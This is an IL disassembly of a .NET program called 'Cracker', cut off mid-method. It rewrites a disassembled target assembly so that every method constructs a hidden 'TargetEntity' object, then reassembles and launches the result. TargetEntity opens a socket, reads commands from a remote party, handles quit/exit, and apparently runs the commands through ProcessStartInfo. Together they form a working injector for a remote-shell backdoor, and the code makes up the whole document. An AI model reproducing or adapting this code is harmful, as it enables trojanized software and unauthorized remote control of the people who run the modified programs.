
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.0.30319.17929




// Metadata version: v4.0.30319
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System.Core
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly Cracker
{
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyConfigurationAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.
  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 12 43 6F 70 79 72 69 67 68 74 20 C2 A9 20   // ...Copyright .. 
                                                                                                  20 32 30 31 36 00 00 )                            //  2016..
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 07 43 72 61 63 6B 65 72 00 00 )             // ...Cracker..
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 

  // --- 下列自定义特性会自动添加，不要取消注释 -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 07 01 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 07 43 72 61 63 6B 65 72 00 00 )             // ...Cracker..
  .custom instance void [mscorlib]System.Runtime.Versioning.TargetFrameworkAttribute::.ctor(string) = ( 01 00 1A 2E 4E 45 54 46 72 61 6D 65 77 6F 72 6B   // ....NETFramework
                                                                                                        2C 56 65 72 73 69 6F 6E 3D 76 34 2E 35 01 00 54   // ,Version=v4.5..T
                                                                                                        0E 14 46 72 61 6D 65 77 6F 72 6B 44 69 73 70 6C   // ..FrameworkDispl
                                                                                                        61 79 4E 61 6D 65 12 2E 4E 45 54 20 46 72 61 6D   // ayName..NET Fram
                                                                                                        65 77 6F 72 6B 20 34 2E 35 )                      // ework 4.5
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 33 31 38 31 33 38 39 39 2D 32 64 38 62   // ..$31813899-2d8b
                                                                                                  2D 34 65 37 65 2D 38 37 65 31 2D 62 61 32 63 31   // -4e7e-87e1-ba2c1
                                                                                                  62 65 39 38 66 62 65 00 00 )                      // be98fbe..
  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 31 2E 30 2E 30 2E 30 00 00 )             // ...1.0.0.0..
  .hash algorithm 0x00008004
  .ver 1:0:0:0
}
.module Cracker.exe
// MVID: {BDE55081-7C80-4757-B57E-D7CE952FD015}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0003       // WINDOWS_CUI
.corflags 0x00020003    //  ILONLY 32BITPREFERRED
// Image base: 0x005A0000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi beforefieldinit Cracker.Program
       extends [mscorlib]System.Object
{
  .class auto ansi sealed nested private beforefieldinit '<>c__DisplayClass5'
         extends [mscorlib]System.Object
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .field public class [System.Core]System.Collections.Generic.HashSet`1<string> iltagsHasRef
    .method public hidebysig specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      // 代码大小       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method '<>c__DisplayClass5'::.ctor

    .method public hidebysig instance bool 
            '<Main>b__0'(string p) cil managed
    {
      // 代码大小       20 (0x14)
      .maxstack  2
      .locals init ([0] bool CS$1$0000)
      IL_0000:  ldarg.0
      IL_0001:  ldfld      class [System.Core]System.Collections.Generic.HashSet`1<string> Cracker.Program/'<>c__DisplayClass5'::iltagsHasRef
      IL_0006:  ldarg.1
      IL_0007:  callvirt   instance bool class [System.Core]System.Collections.Generic.HashSet`1<string>::Contains(!0)
      IL_000c:  ldc.i4.0
      IL_000d:  ceq
      IL_000f:  stloc.0
      IL_0010:  br.s       IL_0012

      IL_0012:  ldloc.0
      IL_0013:  ret
    } // end of method '<>c__DisplayClass5'::'<Main>b__0'

  } // end of class '<>c__DisplayClass5'

  .field private static class [mscorlib]System.Func`2<string,string> 'CS$<>9__CachedAnonymousMethodDelegate3'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private static class [mscorlib]System.Func`2<string,int32> 'CS$<>9__CachedAnonymousMethodDelegate4'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method private hidebysig static void  Main(string[] args) cil managed
  {
    .entrypoint
    // 代码大小       789 (0x315)
    .maxstack  4
    .locals init ([0] string sampleil,
             [1] string filted_sample,
             [2] string fileContent,
             [3] string hook,
             [4] string template,
             [5] string[] keyMock,
             [6] string s,
             [7] string v,
             [8] int32 clazz,
             [9] int32 idx,
             [10] int32 brace,
             [11] int32 n,
             [12] class [System]System.Text.RegularExpressions.MatchCollection matchCollection,
             [13] class [System.Core]System.Collections.Generic.HashSet`1<string> iltags,
             [14] class [System]System.Text.RegularExpressions.Match match,
             [15] string iltag,
             [16] string tag,
             [17] int32 found,
             [18] int32 lineStart,
             [19] int32 lastilStart,
             [20] class [mscorlib]System.Collections.Generic.List`1<string> iltagsRemoveList,
             [21] class Cracker.Program/'<>c__DisplayClass5' 'CS$<>8__locals6',
             [22] char[] CS$0$0000,
             [23] string[] CS$6$0001,
             [24] int32 CS$7$0002,
             [25] bool CS$4$0003,
             [26] class [mscorlib]System.Collections.IEnumerator CS$5$0004,
             [27] class [mscorlib]System.IDisposable CS$0$0005,
             [28] valuetype [System.Core]System.Collections.Generic.HashSet`1/Enumerator<string> CS$5$0006,
             [29] valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string> CS$5$0007)
    IL_0000:  newobj     instance void Cracker.Program/'<>c__DisplayClass5'::.ctor()
    IL_0005:  stloc.s    'CS$<>8__locals6'
    IL_0007:  nop
    IL_0008:  ldstr      "D:\\MyConfiguration\\lzy13870\\Documents\\Visual Studi"
    + "o 2012\\Projects\\Cracker\\bin\\Debug\\template.il"
    IL_000d:  stloc.0
    IL_000e:  ldstr      "D:\\MyConfiguration\\lzy13870\\Documents\\Visual Studi"
    + "o 2012\\Projects\\Cracker\\bin\\Debug\\filted_sample.il"
    IL_0013:  stloc.1
    IL_0014:  ldloc.0
    IL_0015:  call       string [mscorlib]System.IO.File::ReadAllText(string)
    IL_001a:  stloc.2
    IL_001b:  ldstr      "\r\n      newobj     instance void Cracker.TargetEnt"
    + "ity::.ctor()"
    IL_0020:  stloc.3
    IL_0021:  ldstr      "D:\\MyConfiguration\\lzy13870\\Documents\\Visual Studi"
    + "o 2012\\Projects\\Cracker\\bin\\Debug\\template.txt"
    IL_0026:  call       string [mscorlib]System.IO.File::ReadAllText(string)
    IL_002b:  stloc.s    template
    IL_002d:  ldstr      "client-CS$<>9__CachedAnonymousMethodDelegate3-<>c_"
    + "_DisplayClass4-<.cctor>b__1"
    IL_0032:  ldc.i4.1
    IL_0033:  newarr     [mscorlib]System.Char
    IL_0038:  stloc.s    CS$0$0000
    IL_003a:  ldloc.s    CS$0$0000
    IL_003c:  ldc.i4.0
    IL_003d:  ldc.i4.s   45
    IL_003f:  stelem.i2
    IL_0040:  ldloc.s    CS$0$0000
    IL_0042:  ldc.i4.1
    IL_0043:  callvirt   instance string[] [mscorlib]System.String::Split(char[],
                                                                          valuetype [mscorlib]System.StringSplitOptions)
    IL_0048:  stloc.s    keyMock
    IL_004a:  nop
    IL_004b:  ldloc.s    keyMock
    IL_004d:  stloc.s    CS$6$0001
    IL_004f:  ldc.i4.0
    IL_0050:  stloc.s    CS$7$0002
    IL_0052:  br.s       IL_0083

    IL_0054:  ldloc.s    CS$6$0001
    IL_0056:  ldloc.s    CS$7$0002
    IL_0058:  ldelem.ref
    IL_0059:  stloc.s    s
    IL_005b:  nop
    IL_005c:  ldstr      "_"
    IL_0061:  ldloc.s    s
    IL_0063:  callvirt   instance char[] [mscorlib]System.String::ToCharArray()
    IL_0068:  call       string [mscorlib]System.String::Join<char>(string,
                                                                    class [mscorlib]System.Collections.Generic.IEnumerable`1<!!0>)
    IL_006d:  stloc.s    v
    IL_006f:  ldloc.s    template
    IL_0071:  ldloc.s    s
    IL_0073:  ldloc.s    v
    IL_0075:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_007a:  stloc.s    template
    IL_007c:  nop
    IL_007d:  ldloc.s    CS$7$0002
    IL_007f:  ldc.i4.1
    IL_0080:  add
    IL_0081:  stloc.s    CS$7$0002
    IL_0083:  ldloc.s    CS$7$0002
    IL_0085:  ldloc.s    CS$6$0001
    IL_0087:  ldlen
    IL_0088:  conv.i4
    IL_0089:  clt
    IL_008b:  stloc.s    CS$4$0003
    IL_008d:  ldloc.s    CS$4$0003
    IL_008f:  brtrue.s   IL_0054

    IL_0091:  ldloc.2
    IL_0092:  ldstr      ".class"
    IL_0097:  callvirt   instance int32 [mscorlib]System.String::IndexOf(string)
    IL_009c:  stloc.s    clazz
    IL_009e:  ldloc.2
    IL_009f:  ldloc.s    clazz
    IL_00a1:  ldloc.s    template
    IL_00a3:  callvirt   instance string [mscorlib]System.String::Insert(int32,
                                                                         string)
    IL_00a8:  stloc.2
    IL_00a9:  ldc.i4.0
    IL_00aa:  stloc.s    idx
    IL_00ac:  br.s       IL_00fb

    IL_00ae:  nop
    IL_00af:  ldloc.2
    IL_00b0:  ldstr      ".maxstack  "
    IL_00b5:  ldloc.s    idx
    IL_00b7:  callvirt   instance int32 [mscorlib]System.String::IndexOf(string,
                                                                         int32)
    IL_00bc:  stloc.s    brace
    IL_00be:  ldloc.s    brace
    IL_00c0:  ldc.i4.0
    IL_00c1:  cgt
    IL_00c3:  ldc.i4.0
    IL_00c4:  ceq
    IL_00c6:  stloc.s    CS$4$0003
    IL_00c8:  ldloc.s    CS$4$0003
    IL_00ca:  brtrue.s   IL_00fa

    IL_00cc:  nop
    IL_00cd:  ldloc.2
    IL_00ce:  ldstr      "\r\n"
    IL_00d3:  ldloc.s    brace
    IL_00d5:  callvirt   instance int32 [mscorlib]System.String::IndexOf(string,
                                                                         int32)
    IL_00da:  ldloc.s    brace
    IL_00dc:  sub
    IL_00dd:  stloc.s    n
    IL_00df:  ldloc.2
    IL_00e0:  ldloc.s    brace
    IL_00e2:  ldloc.s    n
    IL_00e4:  add
    IL_00e5:  ldloc.3
    IL_00e6:  callvirt   instance string [mscorlib]System.String::Insert(int32,
                                                                         string)
    IL_00eb:  stloc.2
    IL_00ec:  ldloc.s    idx
    IL_00ee:  ldloc.3
    IL_00ef:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_00f4:  ldc.i4.1
    IL_00f5:  add
    IL_00f6:  add
    IL_00f7:  stloc.s    idx
    IL_00f9:  nop
    IL_00fa:  nop
    IL_00fb:  ldloc.2
    IL_00fc:  ldstr      ".method "
    IL_0101:  ldloc.s    idx
    IL_0103:  ldc.i4.1
    IL_0104:  add
    IL_0105:  callvirt   instance int32 [mscorlib]System.String::IndexOf(string,
                                                                         int32)
    IL_010a:  dup
    IL_010b:  stloc.s    idx
    IL_010d:  ldc.i4.0
    IL_010e:  cgt
    IL_0110:  stloc.s    CS$4$0003
    IL_0112:  ldloc.s    CS$4$0003
    IL_0114:  brtrue.s   IL_00ae

    IL_0116:  ldloc.2
    IL_0117:  ldstr      "IL_[0-9a-fA-F]+"
    IL_011c:  call       class [System]System.Text.RegularExpressions.MatchCollection [System]System.Text.RegularExpressions.Regex::Matches(string,
                                                                                                                                            string)
    IL_0121:  stloc.s    matchCollection
    IL_0123:  newobj     instance void class [System.Core]System.Collections.Generic.HashSet`1<string>::.ctor()
    IL_0128:  stloc.s    iltags
    IL_012a:  ldloc.s    'CS$<>8__locals6'
    IL_012c:  newobj     instance void class [System.Core]System.Collections.Generic.HashSet`1<string>::.ctor()
    IL_0131:  stfld      class [System.Core]System.Collections.Generic.HashSet`1<string> Cracker.Program/'<>c__DisplayClass5'::iltagsHasRef
    IL_0136:  nop
    IL_0137:  ldloc.s    matchCollection
    IL_0139:  callvirt   instance class [mscorlib]System.Collections.IEnumerator [System]System.Text.RegularExpressions.MatchCollection::GetEnumerator()
    IL_013e:  stloc.s    CS$5$0004
    .try
    {
      IL_0140:  br.s       IL_0161

      IL_0142:  ldloc.s    CS$5$0004
      IL_0144:  callvirt   instance object [mscorlib]System.Collections.IEnumerator::get_Current()
      IL_0149:  castclass  [System]System.Text.RegularExpressions.Match
      IL_014e:  stloc.s    match
      IL_0150:  nop
      IL_0151:  ldloc.s    iltags
      IL_0153:  ldloc.s    match
      IL_0155:  callvirt   instance string [System]System.Text.RegularExpressions.Capture::get_Value()
      IL_015a:  callvirt   instance bool class [System.Core]System.Collections.Generic.HashSet`1<string>::Add(!0)
      IL_015f:  pop
      IL_0160:  nop
      IL_0161:  ldloc.s    CS$5$0004
      IL_0163:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_0168:  stloc.s    CS$4$0003
      IL_016a:  ldloc.s    CS$4$0003
      IL_016c:  brtrue.s   IL_0142

      IL_016e:  leave.s    IL_018d

    }  // end .try
    finally
    {
      IL_0170:  ldloc.s    CS$5$0004
      IL_0172:  isinst     [mscorlib]System.IDisposable
      IL_0177:  stloc.s    CS$0$0005
      IL_0179:  ldloc.s    CS$0$0005
      IL_017b:  ldnull
      IL_017c:  ceq
      IL_017e:  stloc.s    CS$4$0003
      IL_0180:  ldloc.s    CS$4$0003
      IL_0182:  brtrue.s   IL_018c

      IL_0184:  ldloc.s    CS$0$0005
      IL_0186:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_018b:  nop
      IL_018c:  endfinally
    }  // end handler
    IL_018d:  nop
    IL_018e:  nop
    IL_018f:  ldloc.s    iltags
    IL_0191:  callvirt   instance valuetype [System.Core]System.Collections.Generic.HashSet`1/Enumerator<!0> class [System.Core]System.Collections.Generic.HashSet`1<string>::GetEnumerator()
    IL_0196:  stloc.s    CS$5$0006
    .try
    {
      IL_0198:  br         IL_021e

      IL_019d:  ldloca.s   CS$5$0006
      IL_019f:  call       instance !0 valuetype [System.Core]System.Collections.Generic.HashSet`1/Enumerator<string>::get_Current()
      IL_01a4:  stloc.s    iltag
      IL_01a6:  nop
      IL_01a7:  ldloc.s    iltag
      IL_01a9:  stloc.s    tag
      IL_01ab:  ldc.i4.m1
      IL_01ac:  stloc.s    found
      IL_01ae:  br.s       IL_0205

      IL_01b0:  nop
      IL_01b1:  ldloc.s    found
      IL_01b3:  call       void [mscorlib]System.Console::WriteLine(int32)
      IL_01b8:  nop
      IL_01b9:  ldloc.2
      IL_01ba:  ldstr      "\r\n"
      IL_01bf:  ldloc.s    found
      IL_01c1:  callvirt   instance int32 [mscorlib]System.String::LastIndexOf(string,
                                                                               int32)
      IL_01c6:  stloc.s    lineStart
      IL_01c8:  ldloc.2
      IL_01c9:  ldstr      "IL_"
      IL_01ce:  ldloc.s    found
      IL_01d0:  callvirt   instance int32 [mscorlib]System.String::LastIndexOf(string,
                                                                               int32)
      IL_01d5:  stloc.s    lastilStart
      IL_01d7:  ldloc.s    lastilStart
      IL_01d9:  ldloc.s    lineStart
      IL_01db:  cgt
      IL_01dd:  ldc.i4.0
      IL_01de:  ceq
      IL_01e0:  stloc.s    CS$4$0003
      IL_01e2:  ldloc.s    CS$4$0003
      IL_01e4:  brtrue.s   IL_0204

      IL_01e6:  nop
      IL_01e7:  ldstr      "tag set. {0}"
      IL_01ec:  ldloc.s    tag
      IL_01ee:  call       void [mscorlib]System.Console::WriteLine(string,
                                                                    object)
      IL_01f3:  nop
      IL_01f4:  ldloc.s    'CS$<>8__locals6'
      IL_01f6:  ldfld      class [System.Core]System.Collections.Generic.HashSet`1<string> Cracker.Program/'<>c__DisplayClass5'::iltagsHasRef
      IL_01fb:  ldloc.s    tag
      IL_01fd:  callvirt   instance bool class [System.Core]System.Collections.Generic.HashSet`1<string>::Add(!0)
      IL_0202:  pop
      IL_0203:  nop
      IL_0204:  nop
      IL_0205:  ldloc.2
      IL_0206:  ldloc.s    tag
      IL_0208:  ldloc.s    found
      IL_020a:  ldc.i4.1
      IL_020b:  add
      IL_020c:  callvirt   instance int32 [mscorlib]System.String::IndexOf(string,
                                                                           int32)
      IL_0211:  dup
      IL_0212:  stloc.s    found
      IL_0214:  ldc.i4.0
      IL_0215:  cgt
      IL_0217:  stloc.s    CS$4$0003
      IL_0219:  ldloc.s    CS$4$0003
      IL_021b:  brtrue.s   IL_01b0

      IL_021d:  nop
      IL_021e:  ldloca.s   CS$5$0006
      IL_0220:  call       instance bool valuetype [System.Core]System.Collections.Generic.HashSet`1/Enumerator<string>::MoveNext()
      IL_0225:  stloc.s    CS$4$0003
      IL_0227:  ldloc.s    CS$4$0003
      IL_0229:  brtrue     IL_019d

      IL_022e:  leave.s    IL_023f

    }  // end .try
    finally
    {
      IL_0230:  ldloca.s   CS$5$0006
      IL_0232:  constrained. valuetype [System.Core]System.Collections.Generic.HashSet`1/Enumerator<string>
      IL_0238:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_023d:  nop
      IL_023e:  endfinally
    }  // end handler
    IL_023f:  nop
    IL_0240:  ldloc.s    iltags
    IL_0242:  ldloc.s    'CS$<>8__locals6'
    IL_0244:  ldftn      instance bool Cracker.Program/'<>c__DisplayClass5'::'<Main>b__0'(string)
    IL_024a:  newobj     instance void class [mscorlib]System.Func`2<string,bool>::.ctor(object,
                                                                                         native int)
    IL_024f:  call       class [mscorlib]System.Collections.Generic.IEnumerable`1<!!0> [System.Core]System.Linq.Enumerable::Where<string>(class [mscorlib]System.Collections.Generic.IEnumerable`1<!!0>,
                                                                                                                                          class [mscorlib]System.Func`2<!!0,bool>)
    IL_0254:  ldsfld     class [mscorlib]System.Func`2<string,string> Cracker.Program::'CS$<>9__CachedAnonymousMethodDelegate3'
    IL_0259:  brtrue.s   IL_026e

    IL_025b:  ldnull
    IL_025c:  ldftn      string Cracker.Program::'<Main>b__1'(string)
    IL_0262:  newobj     instance void class [mscorlib]System.Func`2<string,string>::.ctor(object,
                                                                                           native int)
    IL_0267:  stsfld     class [mscorlib]System.Func`2<string,string> Cracker.Program::'CS$<>9__CachedAnonymousMethodDelegate3'
    IL_026c:  br.s       IL_026e

    IL_026e:  ldsfld     class [mscorlib]System.Func`2<string,string> Cracker.Program::'CS$<>9__CachedAnonymousMethodDelegate3'
    IL_0273:  call       class [mscorlib]System.Collections.Generic.IEnumerable`1<!!1> [System.Core]System.Linq.Enumerable::Select<string,string>(class [mscorlib]System.Collections.Generic.IEnumerable`1<!!0>,
                                                                                                                                                  class [mscorlib]System.Func`2<!!0,!!1>)
    IL_0278:  ldsfld     class [mscorlib]System.Func`2<string,int32> Cracker.Program::'CS$<>9__CachedAnonymousMethodDelegate4'
    IL_027d:  brtrue.s   IL_0292

    IL_027f:  ldnull
    IL_0280:  ldftn      int32 Cracker.Program::'<Main>b__2'(string)
    IL_0286:  newobj     instance void class [mscorlib]System.Func`2<string,int32>::.ctor(object,
                                                                                          native int)
    IL_028b:  stsfld     class [mscorlib]System.Func`2<string,int32> Cracker.Program::'CS$<>9__CachedAnonymousMethodDelegate4'
    IL_0290:  br.s       IL_0292

    IL_0292:  ldsfld     class [mscorlib]System.Func`2<string,int32> Cracker.Program::'CS$<>9__CachedAnonymousMethodDelegate4'
    IL_0297:  call       class [System.Core]System.Linq.IOrderedEnumerable`1<!!0> [System.Core]System.Linq.Enumerable::OrderByDescending<string,int32>(class [mscorlib]System.Collections.Generic.IEnumerable`1<!!0>,
                                                                                                                                                       class [mscorlib]System.Func`2<!!0,!!1>)
    IL_029c:  call       class [mscorlib]System.Collections.Generic.List`1<!!0> [System.Core]System.Linq.Enumerable::ToList<string>(class [mscorlib]System.Collections.Generic.IEnumerable`1<!!0>)
    IL_02a1:  stloc.s    iltagsRemoveList
    IL_02a3:  nop
    IL_02a4:  ldloc.s    iltagsRemoveList
    IL_02a6:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<!0> class [mscorlib]System.Collections.Generic.List`1<string>::GetEnumerator()
    IL_02ab:  stloc.s    CS$5$0007
    .try
    {
      IL_02ad:  br.s       IL_02da

      IL_02af:  ldloca.s   CS$5$0007
      IL_02b1:  call       instance !0 valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::get_Current()
      IL_02b6:  stloc.s    s
      IL_02b8:  nop
      IL_02b9:  br.s       IL_02cb

      IL_02bb:  nop
      IL_02bc:  ldloc.2
      IL_02bd:  ldloc.s    s
      IL_02bf:  ldsfld     string [mscorlib]System.String::Empty
      IL_02c4:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_02c9:  stloc.2
      IL_02ca:  nop
      IL_02cb:  ldloc.2
      IL_02cc:  ldloc.s    s
      IL_02ce:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_02d3:  stloc.s    CS$4$0003
      IL_02d5:  ldloc.s    CS$4$0003
      IL_02d7:  brtrue.s   IL_02bb

      IL_02d9:  nop
      IL_02da:  ldloca.s   CS$5$0007
      IL_02dc:  call       instance bool valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::MoveNext()
      IL_02e1:  stloc.s    CS$4$0003
      IL_02e3:  ldloc.s    CS$4$0003
      IL_02e5:  brtrue.s   IL_02af

      IL_02e7:  leave.s    IL_02f8

    }  // end .try
    finally
    {
      IL_02e9:  ldloca.s   CS$5$0007
      IL_02eb:  constrained. valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>
      IL_02f1:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_02f6:  nop
      IL_02f7:  endfinally
    }  // end handler
    IL_02f8:  nop
    IL_02f9:  ldloc.1
    IL_02fa:  ldloc.2
    IL_02fb:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                     string)
    IL_0300:  nop
    IL_0301:  ldloc.1
    IL_0302:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
    IL_0307:  pop
    IL_0308:  ldstr      "ok."
    IL_030d:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0312:  nop
    IL_0313:  nop
    IL_0314:  ret
  } // end of method Program::Main

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // 代码大小       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Program::.ctor

  .method private hidebysig static string 
          '<Main>b__1'(string p) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // 代码大小       16 (0x10)
    .maxstack  2
    .locals init ([0] string CS$1$0000)
    IL_0000:  ldstr      "{0}:  "
    IL_0005:  ldarg.0
    IL_0006:  call       string [mscorlib]System.String::Format(string,
                                                                object)
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method Program::'<Main>b__1'

  .method private hidebysig static int32 
          '<Main>b__2'(string p) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // 代码大小       11 (0xb)
    .maxstack  1
    .locals init ([0] int32 CS$1$0000)
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0006:  stloc.0
    IL_0007:  br.s       IL_0009

    IL_0009:  ldloc.0
    IL_000a:  ret
  } // end of method Program::'<Main>b__2'

} // end of class Cracker.Program

.class public auto ansi Cracker.TargetEntity
       extends [mscorlib]System.Object
{
  .class auto ansi sealed nested private beforefieldinit '<>c__DisplayClass3'
         extends [mscorlib]System.Object
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .field public class [System]System.Net.Sockets.Socket client
    .method public hidebysig specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      // 代码大小       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method '<>c__DisplayClass3'::.ctor

    .method public hidebysig instance void 
            '<.cctor>b__1'(object d) cil managed
    {
      // 代码大小       350 (0x15e)
      .maxstack  4
      .locals init ([0] class [mscorlib]System.Text.StringBuilder cmdBuilder,
               [1] uint8[] buf,
               [2] string got,
               [3] string cmd,
               [4] class [System]System.Diagnostics.ProcessStartInfo psi,
               [5] string output,
               [6] char[] CS$0$0000,
               [7] bool CS$4$0001)
      IL_0000:  nop
      IL_0001:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0006:  stloc.0
      IL_0007:  br         IL_0148

      IL_000c:  nop
      .try
      {
        IL_000d:  nop
        IL_000e:  ldc.i4     0x400
        IL_0013:  newarr     [mscorlib]System.Byte
        IL_0018:  stloc.1
        IL_0019:  ldarg.0
        IL_001a:  ldfld      class [System]System.Net.Sockets.Socket Cracker.TargetEntity/'<>c__DisplayClass3'::client
        IL_001f:  ldloc.1
        IL_0020:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[])
        IL_0025:  pop
        IL_0026:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_Default()
        IL_002b:  ldloc.1
        IL_002c:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
        IL_0031:  ldc.i4.1
        IL_0032:  newarr     [mscorlib]System.Char
        IL_0037:  stloc.s    CS$0$0000
        IL_0039:  ldloc.s    CS$0$0000
        IL_003b:  callvirt   instance string [mscorlib]System.String::Trim(char[])
        IL_0040:  stloc.2
        IL_0041:  ldloc.2
        IL_0042:  ldstr      "\r\n"
        IL_0047:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                       string)
        IL_004c:  ldc.i4.0
        IL_004d:  ceq
        IL_004f:  stloc.s    CS$4$0001
        IL_0051:  ldloc.s    CS$4$0001
        IL_0053:  brtrue     IL_0138

        IL_0058:  nop
        IL_0059:  ldloc.0
        IL_005a:  callvirt   instance string [mscorlib]System.Object::ToString()
        IL_005f:  ldc.i4.3
        IL_0060:  newarr     [mscorlib]System.Char
        IL_0065:  stloc.s    CS$0$0000
        IL_0067:  ldloc.s    CS$0$0000
        IL_0069:  ldc.i4.0
        IL_006a:  ldc.i4.s   13
        IL_006c:  stelem.i2
        IL_006d:  ldloc.s    CS$0$0000
        IL_006f:  ldc.i4.1
        IL_0070:  ldc.i4.s   10
        IL_0072:  stelem.i2
        IL_0073:  ldloc.s    CS$0$0000
        IL_0075:  ldc.i4.2
        IL_0076:  ldc.i4.s   32
        IL_0078:  stelem.i2
        IL_0079:  ldloc.s    CS$0$0000
        IL_007b:  callvirt   instance string [mscorlib]System.String::Trim(char[])
        IL_0080:  stloc.3
        IL_0081:  ldloc.3
        IL_0082:  ldstr      "quit"
        IL_0087:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                       string)
        IL_008c:  brtrue.s   IL_00ab

        IL_008e:  ldloc.3
        IL_008f:  ldstr      "q"
        IL_0094:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                       string)
        IL_0099:  brtrue.s   IL_00ab

        IL_009b:  ldloc.3
        IL_009c:  ldstr      "exit"
        IL_00a1:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                       string)
        IL_00a6:  ldc.i4.0
        IL_00a7:  ceq
        IL_00a9:  br.s       IL_00ac

        IL_00ab:  ldc.i4.0
        IL_00ac:  nop
        IL_00ad:  stloc.s    CS$4$0001
        IL_00af:  ldloc.s    CS$4$0001
        IL_00b1:  brtrue.s   IL_00dd

        IL_00b3:  nop
        IL_00b4:  ldarg.0
        IL_00b5:  ldfld      class [System]System.Net.Sockets.Socket Cracker.TargetEntity/'<>c__DisplayClass3'::client
        IL_00ba:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_Default()
        IL_00bf:  ldstr      "Bye!"
        IL_00c4:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
        IL_00c9:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[])
        IL_00ce:  pop
        IL_00cf:  ldarg.0
